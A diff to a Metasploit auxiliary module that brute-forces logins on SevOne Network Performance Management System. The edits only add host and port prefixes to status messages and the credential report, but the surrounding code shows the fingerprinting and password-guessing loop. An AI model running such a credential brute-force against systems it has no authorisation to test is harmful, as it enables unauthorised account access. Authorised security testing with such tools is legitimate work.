@@ -38,11 +38,11 @@ class Metasploit3 < Msf::Auxiliary
 
 	def run_host(ip)
 		unless is_app_sevone?
-			print_error("Application does not appear to be SevOne. Module will not continue.")
+			print_error("#{rhost}:#{rport} - Application does not appear to be SevOne. Module will not continue.")
 			return
 		end
 
-		print_status("Starting login brute force...")
+		print_status("#{rhost}:#{rport} - Starting login brute force...")
 		each_user_pass do |user, pass|
 			do_login(user, pass)
 		end
@@ -61,7 +61,7 @@ class Metasploit3 < Msf::Auxiliary
 		if (res and res.code.to_i == 200 and res.headers['Set-Cookie'].include?('SEVONE'))
 			version_key = /Version: <strong>(.+)<\/strong>/
 			version = res.body.scan(version_key).flatten
-			print_good("Application confirmed to be SevOne Network Performance Management System version #{version}")
+			print_good("#{rhost}:#{rport} - Application confirmed to be SevOne Network Performance Management System version #{version}")
 			return true
 		end
 		return false
@@ -71,7 +71,7 @@ class Metasploit3 < Msf::Auxiliary
 	# Brute-force the login page
 	#
 	def do_login(user, pass)
-		vprint_status("Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
+		vprint_status("#{rhost}:#{rport} - Trying username:'#{user.inspect}' with password:'#{pass.inspect}'")
 		begin
 			res = send_request_cgi(
 			{
@@ -91,14 +91,14 @@ class Metasploit3 < Msf::Auxiliary
 		key = JSON.parse(res.body)["statusString"]
 
 		if (not res or key != "#{check_key}")
-			vprint_error("FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
+			vprint_error("#{rhost}:#{rport} - FAILED LOGIN. '#{user.inspect}' : '#{pass.inspect}' with code #{res.code}")
 			return :skip_pass
 		else
-			print_good("SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
+			print_good("#{rhost}:#{rport} - SUCCESSFUL LOGIN. '#{user.inspect}' : '#{pass.inspect}'")
 
 			report_hash = {
-				:host   => datastore['RHOST'],
-				:port   => datastore['RPORT'],
+				:host   => rhost,
+				:port   => rport,
 				:sname  => 'SevOne Network Performance Management System Application',
 				:user   => user,
 				:pass   => pass,
@@ -110,7 +110,7 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-			print_error("HTTP Connection Failed, Aborting")
+			print_error("#{rhost}:#{rport} - HTTP Connection Failed, Aborting")
 			return :abort
 		end
 	end
